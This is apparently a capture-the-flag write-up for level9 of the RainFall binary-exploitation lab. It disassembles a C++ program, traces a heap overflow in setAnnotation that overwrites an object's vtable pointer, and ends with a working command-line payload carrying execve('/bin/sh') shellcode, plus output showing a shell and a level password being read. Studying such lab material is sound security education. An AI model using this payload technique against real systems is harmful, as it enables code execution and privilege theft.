## level9
The obdump of level9 is like so
```
080485f4 <main>:
 80485f4:       55                      push   ebp
 80485f5:       89 e5                   mov    ebp,esp
 80485f7:       53                      push   ebx
 80485f8:       83 e4 f0                and    esp,0xfffffff0
 80485fb:       83 ec 20                sub    esp,0x20
 80485fe:       83 7d 08 01             cmp    DWORD PTR [ebp+0x8],0x1
 8048602:       7f 0c                   jg     8048610 <main+0x1c>
 8048604:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 804860b:       e8 e0 fe ff ff          call   80484f0 <_exit@plt>
 8048610:       c7 04 24 6c 00 00 00    mov    DWORD PTR [esp],0x6c
 8048617:       e8 14 ff ff ff          call   8048530 <_Znwj@plt>
 804861c:       89 c3                   mov    ebx,eax
 804861e:       c7 44 24 04 05 00 00    mov    DWORD PTR [esp+0x4],0x5
 8048625:       00
 8048626:       89 1c 24                mov    DWORD PTR [esp],ebx
 8048629:       e8 c8 00 00 00          call   80486f6 <_ZN1NC1Ei>
 804862e:       89 5c 24 1c             mov    DWORD PTR [esp+0x1c],ebx
 8048632:       c7 04 24 6c 00 00 00    mov    DWORD PTR [esp],0x6c
 8048639:       e8 f2 fe ff ff          call   8048530 <_Znwj@plt>
 804863e:       89 c3                   mov    ebx,eax
 8048640:       c7 44 24 04 06 00 00    mov    DWORD PTR [esp+0x4],0x6
 8048647:       00
 8048648:       89 1c 24                mov    DWORD PTR [esp],ebx
 804864b:       e8 a6 00 00 00          call   80486f6 <_ZN1NC1Ei>
 8048650:       89 5c 24 18             mov    DWORD PTR [esp+0x18],ebx
 8048654:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 8048658:       89 44 24 14             mov    DWORD PTR [esp+0x14],eax
 804865c:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 8048660:       89 44 24 10             mov    DWORD PTR [esp+0x10],eax
 8048664:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 8048667:       83 c0 04                add    eax,0x4
 804866a:       8b 00                   mov    eax,DWORD PTR [eax]
 804866c:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048670:       8b 44 24 14             mov    eax,DWORD PTR [esp+0x14]
 8048674:       89 04 24                mov    DWORD PTR [esp],eax
 8048677:       e8 92 00 00 00          call   804870e <_ZN1N13setAnnotationEPc>
 804867c:       8b 44 24 10             mov    eax,DWORD PTR [esp+0x10]
 8048680:       8b 00                   mov    eax,DWORD PTR [eax]
 8048682:       8b 10                   mov    edx,DWORD PTR [eax]
 8048684:       8b 44 24 14             mov    eax,DWORD PTR [esp+0x14]
 8048688:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 804868c:       8b 44 24 10             mov    eax,DWORD PTR [esp+0x10]
 8048690:       89 04 24                mov    DWORD PTR [esp],eax
 8048693:       ff d2                   call   edx
 8048695:       8b 5d fc                mov    ebx,DWORD PTR [ebp-0x4]
 8048698:       c9                      leave
 8048699:       c3                      ret

0804869a <_Z41__static_initialization_and_destruction_0ii>:
 804869a:       55                      push   ebp
 804869b:       89 e5                   mov    ebp,esp
 804869d:       83 ec 18                sub    esp,0x18
 80486a0:       83 7d 08 01             cmp    DWORD PTR [ebp+0x8],0x1
 80486a4:       75 32                   jne    80486d8 <_Z41__static_initialization_and_destruction_0ii+0x3e>
 80486a6:       81 7d 0c ff ff 00 00    cmp    DWORD PTR [ebp+0xc],0xffff
 80486ad:       75 29                   jne    80486d8 <_Z41__static_initialization_and_destruction_0ii+0x3e>
 80486af:       c7 04 24 b4 9b 04 08    mov    DWORD PTR [esp],0x8049bb4
 80486b6:       e8 15 fe ff ff          call   80484d0 <_ZNSt8ios_base4InitC1Ev@plt>
 80486bb:       b8 00 85 04 08          mov    eax,0x8048500
 80486c0:       c7 44 24 08 78 9b 04    mov    DWORD PTR [esp+0x8],0x8049b78
 80486c7:       08
 80486c8:       c7 44 24 04 b4 9b 04    mov    DWORD PTR [esp+0x4],0x8049bb4
 80486cf:       08
 80486d0:       89 04 24                mov    DWORD PTR [esp],eax
 80486d3:       e8 d8 fd ff ff          call   80484b0 <__cxa_atexit@plt>
 80486d8:       c9                      leave
 80486d9:       c3                      ret

080486da <_GLOBAL__sub_I_main>:
 80486da:       55                      push   ebp
 80486db:       89 e5                   mov    ebp,esp
 80486dd:       83 ec 18                sub    esp,0x18
 80486e0:       c7 44 24 04 ff ff 00    mov    DWORD PTR [esp+0x4],0xffff
 80486e7:       00
 80486e8:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 80486ef:       e8 a6 ff ff ff          call   804869a <_Z41__static_initialization_and_destruction_0ii>
 80486f4:       c9                      leave
 80486f5:       c3                      ret

080486f6 <_ZN1NC1Ei>:
 80486f6:       55                      push   ebp
 80486f7:       89 e5                   mov    ebp,esp
 80486f9:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 80486fc:       c7 00 48 88 04 08       mov    DWORD PTR [eax],0x8048848
 8048702:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048705:       8b 55 0c                mov    edx,DWORD PTR [ebp+0xc]
 8048708:       89 50 68                mov    DWORD PTR [eax+0x68],edx
 804870b:       5d                      pop    ebp
 804870c:       c3                      ret
 804870d:       90                      nop

0804870e <_ZN1N13setAnnotationEPc>:
 804870e:       55                      push   ebp
 804870f:       89 e5                   mov    ebp,esp
 8048711:       83 ec 18                sub    esp,0x18
 8048714:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 8048717:       89 04 24                mov    DWORD PTR [esp],eax
 804871a:       e8 01 fe ff ff          call   8048520 <strlen@plt>
 804871f:       8b 55 08                mov    edx,DWORD PTR [ebp+0x8]
 8048722:       83 c2 04                add    edx,0x4
 8048725:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 8048729:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 804872c:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048730:       89 14 24                mov    DWORD PTR [esp],edx
 8048733:       e8 d8 fd ff ff          call   8048510 <memcpy@plt>
 8048738:       c9                      leave
 8048739:       c3                      ret

0804873a <_ZN1NplERS_>:
 804873a:       55                      push   ebp
 804873b:       89 e5                   mov    ebp,esp
 804873d:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048740:       8b 50 68                mov    edx,DWORD PTR [eax+0x68]
 8048743:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 8048746:       8b 40 68                mov    eax,DWORD PTR [eax+0x68]
 8048749:       01 d0                   add    eax,edx
 804874b:       5d                      pop    ebp
 804874c:       c3                      ret
 804874d:       90                      nop

0804874e <_ZN1NmiERS_>:
 804874e:       55                      push   ebp
 804874f:       89 e5                   mov    ebp,esp
 8048751:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048754:       8b 50 68                mov    edx,DWORD PTR [eax+0x68]
 8048757:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 804875a:       8b 40 68                mov    eax,DWORD PTR [eax+0x68]
 804875d:       89 d1                   mov    ecx,edx
 804875f:       29 c1                   sub    ecx,eax
 8048761:       89 c8                   mov    eax,ecx
 8048763:       5d                      pop    ebp
 8048764:       c3                      ret
 8048765:       90                      nop
 8048766:       90                      nop
 8048767:       90                      nop
 8048768:       90                      nop
 8048769:       90                      nop
 804876a:       90                      nop
 804876b:       90                      nop
 804876c:       90                      nop
 804876d:       90                      nop
 804876e:       90                      nop
 804876f:       90                      nop

```
I saw some strange sections, and like ` <_Z41__static_initialization_and_destruction_0ii>`, and I found out that [this is generated by C++ compilers](https://stackoverflow.com/questions/2434505/g-static-initialization-and-destruction-0int-int-what-is-it) to help with class construction and destruction. 

The asm is hella weird compared to the last 9 levels so here are the bits that I observed.

For functions with weird symbols like `_ZN1NC1Ei`, `_ZN1NplERS_` and whatnot, its obfusticated by the compiler. We can get the actual symbols in GDB by stepping into those functions like so 

![image](https://hackmd.io/_uploads/H1y-SclLp.png)

As we can see, we are in function `_ZN1NC2Ei`, however the compiler says we are in the function name `N::N(int) ()`. Which is a constructor for the N class for CPP programming. Classes in cpp have similar memory layout with C structs ; elements inside the class are close to each other, with some padding.

With that said, here is the pseudocode based on the disassembly

```cpp=
#include <string.h>

class N {
    public :
        int val;
        char *annotation;
    
        // 0804870e 
        void setAnnotation(const char *str)
        {
            memcpy(annotation, str, strlen(str));
        }
    
        // 0804873a 
        int operator+(N arg)
        {
            return (this->val + N.val);
        }
}

int main(int argc, char **argv)
{
    if (argc != 2)	
		std::exit(1);
    
    N *a = new N(5);
    N *b = new N(6);
    
    a->setAnnotation(argv[1]);
    return (*a + *b);
}
```
The programming mistake that had happened there is in the function `setAnnotation`, where the program calls memcpy on an uninitialized array. we can test this by supplying a long argv. As we can see, the program segfaults.
![image](https://hackmd.io/_uploads/rytMF9xIT.png)

It overwrote the function pointer for `operator+` which is obtained by derefrencing the pointer to the N class, which is called at instruction `8048693`. After trail and error, we figured the offset is **109**
![image](https://hackmd.io/_uploads/ByjIXjlLa.png)

I tried using the env method but there is too much calculation involved, so i just hardcoded the addresses to make it jump to the buffer, which will contain another address to make it jump to the shellcode instructions.

![image](https://hackmd.io/_uploads/SJ22KnxUT.png)

As we can see, the start of the buffer is `0x0804a00c` according to memcpy. `0x0804a00c` will contain an address which points to the start of the buffer + 4, which is `0x0804a010`. The program will derefrence `0x0804a00c` to `0x0804a010`, which derefrences again to our shellcode. 

To make the program read `0x0804a00c`, we need to make sure our payload hits the **109** offset

```
./level9 `python -c "print '\x08\x04\xa0\x10'[::-1] + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'b' * 83 + '\x08\x04\xa0\x0c'[::-1]"`
```
The password is obtained `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`

```
level9@RainFall:~$ ./level9 `python -c "print '\x08\x04\xa0\x10'[::-1] + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'b' * 83 + '\x08\x04\xa0\x0c'[::-1]"`
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$
```
